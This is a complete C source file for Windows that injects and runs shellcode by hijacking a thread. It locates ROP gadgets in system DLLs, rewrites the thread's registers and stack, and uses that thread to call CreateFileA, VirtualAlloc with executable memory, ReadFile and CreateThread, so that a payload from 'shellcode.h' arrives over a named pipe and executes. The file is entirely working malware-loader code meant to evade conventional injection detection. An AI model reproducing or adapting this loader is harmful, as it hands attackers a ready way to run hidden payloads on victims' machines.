#include <Windows.h>

#include <stdio.h>
#include <stdint.h>

#include "shellcode.h"

#define ArraySize(x) (sizeof x / sizeof x[0])

typedef struct Gadgets {
    UINT_PTR pshc; // push Rdx; call Rax
    UINT_PTR jmps; // jmp $
    UINT_PTR ret;  // ret
} Gadgets;

UINT_PTR find_gadget(const unsigned char* pattern, int sz, const char* name) {
    HMODULE base = GetModuleHandleA(name);
    if (!base) {
        return 0;
    }

    // Adjust for 64-bit pointers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((uintptr_t)base + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    // Locate the .text section
    for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((const char*)sectionHeader[i].Name, ".text") == 0) {
            uintptr_t ptr = (uintptr_t)base + sectionHeader[i].VirtualAddress;
            size_t virtsize = sectionHeader[i].SizeOfRawData;
            size_t c = 0;

            // Search for the pattern
            while (c + sz <= virtsize && memcmp(pattern, (const unsigned char*)(ptr + c), sz) != 0) {
                c++;
            }
            if (c + sz <= virtsize) {
                return ptr + c; // Return the address of the found pattern
            }
            else {
                return 0; // Pattern not found
            }
        }
    }
    return 0; // No .text section found
}

void waitunblock(HANDLE thd) {
    FILETIME a, b, c, d;
    GetThreadTimes(thd, &a, &b, &c, &d);
    DWORD pt = d.dwLowDateTime;
    while (1) {
        Sleep(2);
        GetThreadTimes(thd, &a, &b, &c, &d);
        if (d.dwLowDateTime - pt > 9) break; //when user time is >90% of total time, we're probably done
        pt = d.dwLowDateTime;
    }
    return;
}

void slay(HANDLE hThread, Gadgets gadgets, DWORD64 a, DWORD64 b, DWORD64 c, DWORD64 d) {

    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(hThread, &ctx);

    ctx.Rsp += 8;

    if (ctx.Rsp != (ctx.Rsp & ~0x0F)) {
        printf("[!] WARNING! About to execute with an unaligned stack.\n[!] This shouldn't happen and may crash the process\n");
    }

    ctx.Rip = gadgets.ret;

    ctx.Rcx = a;
    ctx.Rdx = b;
    ctx.R8  = c;
    ctx.R9  = d;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
}

DWORD64 pushm(HANDLE thd, Gadgets gadgets, DWORD64 data) {
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };

    GetThreadContext(thd, &ctx);

    ctx.Rsp += 8;
    ctx.Rip = gadgets.pshc;
    ctx.Rdx = data;
    ctx.Rax = gadgets.jmps;

    SetThreadContext(thd, &ctx);
    ResumeThread(thd);
    Sleep(2);
    SuspendThread(thd);

    return ctx.Rsp - 8;
}

void push_junk(HANDLE hThread, Gadgets gadgets) {
    
    SuspendThread(hThread);
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    
    GetThreadContext(hThread, &ctx);

    ctx.Rdx = 0;
    ctx.Rip = gadgets.pshc;
    ctx.Rax = gadgets.jmps;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);
    Sleep(2);
    SuspendThread(hThread);
}

DWORD64 get_ret_val(HANDLE hThread, Gadgets gadgets) {

    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    SuspendThread(hThread);

    GetThreadContext(hThread, &ctx);
    return ctx.Rax;
}

DWORD WINAPI ThreadFunc(LPVOID lpParam) {
    char test[100] = {0};
    while (1) {
        printf("[*] Victum Thread is running...\n");
        Sleep(100);
    }
    return 0;
}

DWORD64 CallFuncRemote(HANDLE hThread, Gadgets gadgets, DWORD64 funcAddr, BOOL returnVal, const uint64_t count, const DWORD64 parameters[]) {

    // 1. Check/Fix Stack alignment
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };

    SuspendThread(hThread);
    GetThreadContext(hThread, &ctx);

    int isStackAlignmentGood = ((ctx.Rsp + 0x08) == ((ctx.Rsp + 0x08) & ~0x0F));
    int isEvenPUSHParameters = ((count <= 4) || (count % 2 == 0));

    ResumeThread(hThread);

    if (isStackAlignmentGood ^ isEvenPUSHParameters) {
        pushm(hThread, gadgets, 0x00);
    }

    // 2. PUSH function parameters
    for (uint64_t i = count; i > 4; i--) {
        pushm(hThread, gadgets, parameters[i-1]);
    }

    // 3. PUSH shadow space if required
    if (count > 4) {
        pushm(hThread, gadgets, 0x00);
        pushm(hThread, gadgets, 0x00);
        pushm(hThread, gadgets, 0x00);
        pushm(hThread, gadgets, 0x00);
    }

    // 4. PUSH jmps save return pointer
    pushm(hThread, gadgets, gadgets.jmps);

    // 5. PUSH function to call address
    pushm(hThread, gadgets, funcAddr);

    // 6. Execute with ret gadget
    slay(hThread, gadgets, 
        (count > 0 ? parameters[0] : 0),
        (count > 1 ? parameters[1] : 0),
        (count > 2 ? parameters[2] : 0),
        (count > 3 ? parameters[3] : 0)
    );

    // 7. Ensure the thread _did_ something
    waitunblock(hThread);

    // 8. Get return value if required
    return (returnVal ? get_ret_val(hThread, gadgets) : 0);
}

int main(void) {

    HANDLE hThread = CreateThread(NULL, 0, ThreadFunc, NULL, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread failed with error code: %lu\n", GetLastError());
        return 1;
    }

    if (LoadLibraryA("rpcrt4.dll") == NULL) {
        printf("[!] LoadLibraryA failed with error code: %lu\n", GetLastError());
        return 1;
    }

    Gadgets gadgets = {
        .pshc = find_gadget("\x52\xFF\xD0", 3, "rpcrt4.dll"),     // push rdx; call rax
        .jmps = find_gadget("\xEB\xFE",     2, "kernelbase.dll"), // jmp $
        .ret  = find_gadget("\xC3",         1, "kernelbase.dll"), // ret
    };

    if (gadgets.pshc == 0 || gadgets.jmps == 0 || gadgets.ret == 0) {
        printf("[!] Gadgets could not be found\n");
        return 1;
    }

    const char pipename[] = "\\\\.\\pipe\\spooky";
    if (ArraySize(pipename) % 8 != 0) {
        printf("[!] pipename (including the null byte) MUST be a multiple of 8\n");
        return 1;
    }

    const UINT32 HeapAllocSize = 0x2000;

    // Set RIP to a `jmp $`, blocks when kernel exit
    // SuspendThread(hThread);
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(hThread, &ctx);

    ctx.Rip = gadgets.jmps;

    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);

    printf("[*] Primed thread, waiting for kernel exit...\n");

    // Wait for thread's user time to increase, signifying kernel exit
    waitunblock(hThread);
    printf("[*] Process exited kernel, ready for injection\n");

    // Push a junk val to stack, this is quite useless but it simplifies the code
    push_junk(hThread, gadgets);

    HANDLE pipe = CreateNamedPipeA(pipename, PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE, 1, HeapAllocSize, 0, 5000, NULL);
    if (pipe == INVALID_HANDLE_VALUE) {
        printf("[!] CreateNamedPipeA failed with error code: %lu\n", GetLastError());
        return 1;
    }

    DWORD64 fnVirtualAlloc = (DWORD64)GetProcAddress(GetModuleHandleA("kernelbase.dll"), "VirtualAlloc");
    DWORD64 fnCreateFileA  = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "CreateFileA");
    DWORD64 fnCreateThread = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "CreateThread");
    DWORD64 fnCloseHandle  = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "CloseHandle");
    DWORD64 fnReadFile     = (DWORD64)GetProcAddress(GetModuleHandleA("kernel32.dll"),   "ReadFile");

    DWORD64 namptr = 0;
    for (int j = ArraySize(pipename); j > 0; j -= 8) {
        DWORD64 num = *(DWORD64*)(pipename + j - 8);
        namptr = pushm(hThread, gadgets, num);
    }
    printf("[*] Pipe name injected to stack\n");

    // CreateFileA
    DWORD64 phand = CallFuncRemote(hThread, gadgets, fnCreateFileA, TRUE, 7, (DWORD64[]) { namptr, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0});
    if ((HANDLE)phand == INVALID_HANDLE_VALUE) {
        printf("[!] CreateFileA returned a bad HANDLE\n");
        return 1;
    }

    // VirtualAlloc
    DWORD64 addr = CallFuncRemote(hThread, gadgets, fnVirtualAlloc, TRUE, 4, (DWORD64[]) { 0, 0x10000, MEM_COMMIT, PAGE_EXECUTE_READWRITE });
    if (!addr) {
        printf("[*] VirtualAlloc Failed\n");
        return 1;
    }
    printf("[*] VirtualAlloc'd memory at: 0x%llu\n", addr);

    // Write Shellcode
    DWORD bw = 0;
    WriteFile(pipe, buf, sizeof(buf), &bw, NULL);

    // ReadFile
    CallFuncRemote(hThread, gadgets, fnReadFile, FALSE, 5, (DWORD64[]) { phand, addr, HeapAllocSize, namptr, 0 });
    printf("[*] ReadFile called\n");

    // CloseHandle
    CallFuncRemote(hThread, gadgets, fnCloseHandle, FALSE, 1, (DWORD64[]) { phand });
    printf("[*] CloseHandle called\n");

    // CreateThread
    CallFuncRemote(hThread, gadgets, fnCreateThread, FALSE, 6, (DWORD64[]) { 0, 0, addr, 0, 0, 0 });
    printf("[*] CreateThread called\n");

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
